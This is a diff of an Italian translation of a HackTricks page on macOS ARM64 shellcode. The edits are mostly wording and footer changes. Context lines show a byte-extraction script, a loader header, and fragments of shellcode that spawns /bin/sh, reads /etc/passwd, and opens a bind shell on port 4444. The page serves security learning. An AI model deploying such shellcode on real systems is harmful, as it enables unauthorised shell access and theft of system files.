+* Prova l'elenco dei metodi della superclasse:
+* Se trovato, riempi la cache e finito
+* Se (resolver) prova il risolutore del metodo e ripeti dalla ricerca della classe
+* Se ancora qui (= tutto il resto è fallito) prova il forwarder
 
 ### Shellcodes
 
@@ -417,9 +439,9 @@ for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ;
 echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
 done
 ```
-<dettagli>
+<details>
 
-<riassunto>Codice C per testare lo shellcode</riassunto>
+<summary>Codice C per testare lo shellcode</summary>
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -469,7 +491,7 @@ return 0;
 
 #### Shell
 
-Prendilo da [**qui**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) e spiegato.
+Prelevato da [**qui**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) e spiegato.
 
 {% tabs %}
 {% tab title="con adr" %}
@@ -539,7 +561,7 @@ sh_path: .asciz "/bin/sh"
 {% endtab %}
 {% endtabs %}
 
-#### Lettura con cat
+#### Leggere con cat
 
 L'obiettivo è eseguire `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, quindi il secondo argomento (x1) è un array di parametri (che in memoria significa uno stack degli indirizzi).
 ```armasm
@@ -611,9 +633,9 @@ sh_c_option: .asciz "-c"
 .align 2
 touch_command: .asciz "touch /tmp/lalala"
 ```
-#### Shell bindata
+#### Shell di bind
 
-Shell bindata da [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) sulla **porta 4444**
+Shell di bind da [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) sulla **porta 4444**
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -764,16 +786,17 @@ mov  x2, xzr
 mov  x16, #59
 svc  #0x1337
 ```
+{% hint style="success" %}
+Impara e pratica l'hacking su AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica l'hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Sostieni HackTricks</summary>
 
-Altri modi per supportare HackTricks:
-
-* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
+* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
